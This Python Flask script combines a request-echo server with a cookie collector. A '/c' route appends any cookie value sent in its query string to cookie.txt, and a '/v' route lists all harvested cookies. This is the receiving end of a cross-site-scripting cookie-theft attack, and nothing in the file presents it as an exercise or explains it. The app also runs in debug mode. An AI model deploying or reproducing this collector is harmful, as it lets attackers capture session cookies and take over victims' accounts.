from flask import Flask, jsonify, request
from werkzeug.routing import Rule
import time, subprocess

app = Flask(__name__)
app.url_map.add(Rule('/', defaults={'path' : ''}, endpoint='index'))
app.url_map.add(Rule('/<path:path>', endpoint='index'))

def validate_status_code(status_code):
    return True if status_code < 600 else False

def extract(d):
    return {key: value for (key, value) in d.items()}

@app.endpoint('index')
def echo(path):
    status_code = int(request.args.get('status') or 200)
    if not validate_status_code(status_code):
        status_code = 200
    data = {
        'success' : True,
        'status' : status_code,
        'time' : time.time(),
        'path' : request.path,
        'script_root' : request.script_root,
        'url' : request.url,
        'base_url' : request.base_url,
        'url_root' : request.url_root,
        'method' : request.method,
        'headers' : extract(request.headers),
        'data' : request.data.decode(encoding='UTF-8'),
        'host' : request.host,
        'args' : extract(request.args),
        'form' : extract(request.form),
        'json' : request.json,
        'cookies' : extract(request.cookies)
    }
    response = jsonify(data)
    response.status_code = status_code
    return response

@app.route('/c', methods=['GET'])
def cookie():
    cookie = request.args.get('c')
    with open('cookie.txt', 'a') as f:
        f.write(cookie + '\n')
    return cookie

@app.route('/v')
def view():
    cookies = { 'cookie':[] }
    try:
        cookies['cookie'] = [
            item.strip('\n') for item in open('cookie.txt', 'r').readlines()
        ]
    except: pass
    return jsonify(cookies)

def main():
    app.run(debug=True)

if __name__ == '__main__':
    main()
